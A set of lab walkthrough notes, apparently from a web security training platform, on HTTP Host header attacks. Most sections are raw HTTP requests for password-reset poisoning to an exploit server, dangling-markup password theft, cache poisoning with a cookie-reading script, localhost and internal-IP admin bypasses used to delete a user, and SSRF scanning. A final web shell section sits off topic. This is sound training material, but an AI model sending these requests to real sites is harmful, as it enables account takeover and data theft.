# HTTP Host Header Attack
HTTP Host header attacks exploit vulnerable websites that handle the value of the Host header in an unsafe way. If the server implicitly trusts the Host header, and fails to validate or escape it properly, an attacker may be able to use this input to inject harmful payloads that manipulate server-side behavior.

## How to test for vulnerabilities using the HTTP Host header
- **Supply an arbitrary Host header:** add arbitrary port value
- **Check for flawed validation**
- **Inject duplicate Host headers**
- **Supply an absolute URL**
- **Indenting HTTP headers with a space character**
- **Inject host override headers:** `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded`, `X-Forwarded-Host`

### LAB: Basic password reset poisoning
Notice the reset password function will send an email with a link containing the value of the `Host` header and the token to the client. Send a reset password request for user `carlos` with the `Host` header value set to our exploit server:

    POST /forgot-password HTTP/2
    Host: exploit-0aba006a0360a28181024c3601cf0036.exploit-server.net/exploit

    csrf=uT5JUzeQyGuAdMlLJ6Lbk4djBrKqWd3E&username=carlos

After Carlos click on the link, visit the log page to obtain the token. Use the token to reset Carlos password and login to his account.

### LAB: Password reset poisoning via dangling markup
Notice the `Host` header at `POST /forgot-password` accepts arbitrary port value and reflects it inside the `href` attribute of the `a` tag. Use danling markup to observe the reset password appearing after the `a` tag:

    POST /forgot-password HTTP/2
    Host: 0a7500ac048205b380390887003600a4.web-security-academy.net:'<a href="//exploit-0ad30065047505668093072501d70058.exploit-server.net/?

    csrf=cNDtaTqwnnnI2PMPmNJoTN8480qllGpl&username=carlos

After Carlos click on the link, visit our log page to view the request:

    "GET /?/login'>click+here</a>+to+login+with+your+new+password:+NJZtqurfeu</p><p>Thanks,<br/>Support+team</p><i>This+email+has+been+scanned+by+the+MacCarthy+Email+Security+service</i> HTTP/1.1" 200

Retrieve the password and login to Carlos' account.

### LAB: Web cache poisoning via ambiguous requests
Notice the `Host` value is reflected inside a script `src` attribute. When sending a request with 2 `Host` header, the second value is reflected inside the script `src` attribute. Send this request:

    GET / HTTP/1.1
    Host: 0a7000b6043a95d480210d90001600a5.h1-web-security-academy.net
    Host: exploit-0a2f00030419953180010ce101190006.exploit-server.net/exploit#

However the cache server only considers the first `Host` header's value as a cache key. Resend this request to make the cache server store it. Now when the victim visits the home page, he is served with our malicious script at the exploit server:

    alert(document.cookie)

### LAB: Host header authentication bypass
Notice when accessing `/admin`, we are restricted with this reason:

    Admin interface only available to local users

This suggested that the admin interface can be accessed if we can trick the server into thinking that we are local users. Send this request:

    GET /admin HTTP/2
    Host: localhost

Now we successfully access the admin interface and found an endpoint to delete user Carlos. Send this request to delete him:

    GET /admin/delete?username=carlos HTTP/2
    Host: localhost

### LAB: Routing-based SSRF
Change the `Host` header of the `GET / HTTP/2` request to use our Burp's Collaborator payload. Send the request and notice the HTTP requesting to our server. This indicates that, we can make the middleware issue a request to an arbitrary server.
Send this request to Intruder, deselect the `Update Host header to match target`. Now create a sniper attack for every IP address in the subnet 192.168.0.0/24. Notice 1 IP address is given us a redirection to the admin interface. Use the found IP to view the admin interface:

    GET /admin HTTP/2
    Host: 192.168.0.101

Now send the delete user request to successfully delete user Carlos:

    POST /admin/delete HTTP/2
    Host: 192.168.0.101

    csrf=RX7lsL6eVBl3Cjnqp6gFiTeFkVPTz2DL&username=carlos

### LAB: SSRF via flawed request parsing
Notice when supplying the target request with the absolute URL, the request is no longer blocked when modifying the `Host` header. Send this request and observe that we can make the middleware issue request to an arbitrary server:

    GET https://0a32000d03ee7e80818fbb8300c0005c.web-security-academy.net/ HTTP/2
    Host: 2y1a02ux3fmrhlpbx6cqqja6dxjq7kv9.oastify.com

Send this request to Intruder, deselect the `Update Host header to match target`. Now create a sniper attack for every IP address in the subnet 192.168.0.0/24. Notice 1 IP address is given us a redirection to the admin interface. Use the found IP to view the admin interface:

    GET https://0a32000d03ee7e80818fbb8300c0005c.web-security-academy.net/admin HTTP/2
    Host: 192.168.0.181

Now send the delete user request to successfully delete user Carlos:

    POST https://0a32000d03ee7e80818fbb8300c0005c.web-security-academy.net/admin/delete HTTP/2
    Host: 192.168.0.181

    csrf=PGU6qglOQEUM9zLMBek6gi355yHPkkCH&username=carlos

### LAB: Host validation bypass via connection state attack
Send the `GET / HTTP/1.1` to Repeater. Duplicate the request and modify it to:

    GET /admin HTTP/1.1
    Host: 192.168.0.1

Group the 2 tabs and `Send in sequence (single connection)`. Notice the admin interface appears. Modify the second request to:

    POST /admin/delete HTTP/1.1
    Host: 192.168.0.1

    csrf=ibqNTHzoorRrNKoUlOPGHLrqcNoezrE0&username=carlos

Resend the group to successfully delete user Carlos.

### LAB: Web shell upload via race condition
Upload a normal JPG file and observe that we can access it via:

    GET /files/avatars/test.jpg HTTP/2

Upload the `test.php` file. Send that request to Repeater. Change the previous request to:

    GET /files/avatars/test.php HTTP/2

Group the 2 tabs into a group (might need to duplicate the second request several times). Now send the group in parallel. Notice in 1 of the `GET /files/avatars/test.php` request, there is a response with Carlos' secret. Submit it to solve the lab.